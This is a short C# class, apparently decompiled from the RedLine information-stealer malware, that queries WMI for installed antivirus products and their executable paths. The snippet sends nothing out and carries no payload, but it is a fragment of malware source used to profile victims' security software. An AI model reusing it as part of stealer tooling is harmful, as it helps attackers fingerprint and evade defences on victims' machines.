namespace RedLine.Models.WMI
{
  public class WmiAntivirusQuery : WmiQueryBase
  {
    public WmiAntivirusQuery()
      : base("AntivirusProduct", (string) null, new string[2]
      {
        "displayName",
        "pathToSignedProductExe"
      })
    {
    }
  }
}
